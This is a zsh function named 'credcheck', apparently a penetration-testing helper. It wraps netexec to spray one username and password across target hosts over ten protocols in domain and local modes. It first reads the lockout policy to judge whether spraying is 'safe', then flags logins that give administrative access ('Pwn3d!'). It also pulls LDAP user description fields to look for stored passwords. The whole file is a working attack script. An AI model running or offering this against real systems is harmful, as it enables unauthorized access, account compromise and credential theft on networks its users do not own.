credcheck() {
  local targets user pass proto mode limit logfile output line stamp label summary cmd rc
  local policy first_target desc
  local -a hits=() admin_hits=() cmd_args modes
  local -A timeouts

  if (( $# == 2 )); then
    targets=${TARGETS:?"Set TARGETS first"}
    user=$1
    pass=$2
  elif (( $# == 3 )); then
    targets=$1
    user=$2
    pass=$3
  else
    print -r -- "Usage: credcheck <user> <pass>"
    print -r -- "   or: credcheck <targets> <user> <pass>"
    return 1
  fi

  first_target=$(print -r -- "${=targets}" | tr ' ' '\n' | head -1)

  if [[ -n "$first_target" ]]; then
    print -r -- "[CMD] timeout 25 netexec smb $first_target --pass-pol"
    policy=$(timeout 25 netexec smb "$first_target" --pass-pol 2>&1 |
      sed -E 's/\x1B\[[0-9;]*[[:alpha:]]//g; s/\r/\n/g')

    if ! print -r -- "$policy" | grep -qiE 'lockout threshold|minimum password length'; then
      print -r -- "[CMD] timeout 25 netexec smb $first_target -u $user -p $pass --pass-pol"
      policy=$(timeout 25 netexec smb "$first_target" -u "$user" -p "$pass" --pass-pol 2>&1 |
        sed -E 's/\x1B\[[0-9;]*[[:alpha:]]//g; s/\r/\n/g')
    fi

    print -r -- "$policy" |
      grep -aiE 'minimum password length|lockout threshold|reset account lockout' |
      sed 's/^.*\(Minimum\|Account\|Reset\)/\1/' |
      cut -c1-70 |
      sed 's/^/  [pol] /'

    if print -r -- "$policy" | grep -qiE 'account lockout threshold:?[[:space:]]*none'; then
      print -r -- "  [pol] Threshold None - accounts do NOT lock. Spraying is safe but noisy."
    elif print -r -- "$policy" | grep -qiE 'account lockout threshold.*[0-9]+'; then
      print -r -- "  [pol] WARNING: lockout threshold detected."
      print -r -- "  [pol] This runs one attempt per protocol per host."
    else
      print -r -- "  [pol] UNREADABLE - assume a low lockout threshold."
    fi
  fi

  mkdir -p "$PWD/nxc" || return 1

  stamp=$(date +%Y%m%d_%H%M%S_%N)
  label=$(print -r -- "$targets" | tr -cs '[:alnum:].-' '_')
  label=${label%_}
  summary="$PWD/nxc/credcheck_${stamp}_${label}_summary.log"

  timeouts=(
    smb 60
    winrm 180
    rdp 300
    mssql 90
    ldap 90
    ssh 60
    ftp 60
    wmi 90
    vnc 60
    nfs 60
  )

  for proto in smb winrm rdp mssql ldap ssh ftp wmi vnc nfs; do
    modes=(domain)

    case "$proto" in
      smb|winrm|rdp|mssql|wmi) modes+=(local) ;;
    esac

    for mode in "${modes[@]}"; do
      logfile="$PWD/nxc/credcheck_${stamp}_${label}_${proto}_${mode}.log"

      cmd_args=(
        timeout "${timeouts[$proto]:-30}"
        netexec "$proto" ${=targets}
        -u "$user"
        -p "$pass"
      )

      [[ "$mode" == local ]] && cmd_args+=(--local-auth)

      cmd=$(printf '%q ' "${cmd_args[@]}")
      print -r -- "[CMD] $cmd"

      script -q -e -c "$cmd" "$logfile"
      rc=$?

      if (( rc == 124 )); then
        print -r -- "[!] $mode/$proto timed out after ${timeouts[$proto]:-30}s"
        continue
      fi

      output=$(sed -E 's/\x1B\[[0-9;]*[[:alpha:]]//g; s/\r/\n/g' "$logfile" 2>/dev/null)

      while IFS= read -r line; do
        [[ "$line" == *"Running nxc"* || -z "${line// /}" ]] && continue
        [[ "$line" == *"[+]"* ]] || continue

        hits+=("$mode/$proto: $line")
        [[ "$line" == *"(Pwn3d!)"* ]] && admin_hits+=("$mode/$proto: $line")
      done <<< "$output"
    done
  done

  if [[ -n "$first_target" ]]; then
    print -r -- "[CMD] timeout 45 netexec ldap $first_target -u $user -p $pass -M get-desc-users"

    desc=$(timeout 45 netexec ldap "$first_target" -u "$user" -p "$pass" \
      -M get-desc-users 2>&1 |
      sed -E 's/\x1B\[[0-9;]*[[:alpha:]]//g; s/\r/\n/g')

    if print -r -- "$desc" | grep -qiE 'temp pwd|password|passwd|pwd:'; then
      print
      print -r -- "[!] DESCRIPTION FIELD may contain credentials:"
      print -r -- "$desc" |
        grep -aiE 'temp pwd|password|passwd|pwd:' |
        sed 's/^.*DC01 *//' |
        head -8 |
        sed 's/^/  /'
    fi
  fi

  {
    print
    print "===== credcheck access summary ====="

    if (( ${#hits} )); then
      print "Accessible services (valid credentials):"
      printf '  %s\n' "${hits[@]}"
      print "[+] ${#hits} accessible service result(s) across tested protocols."

      if (( ${#admin_hits} )); then
        print
        print "Administrative access (Pwn3d!):"
        printf '  %s\n' "${admin_hits[@]}"
      else
        print "[-] No administrative access reported."
      fi
    else
      print "[-] No successful credentials found across tested protocols."
    fi
  } | tee "$summary"

  print -r -- "[+] Summary: $summary"
}
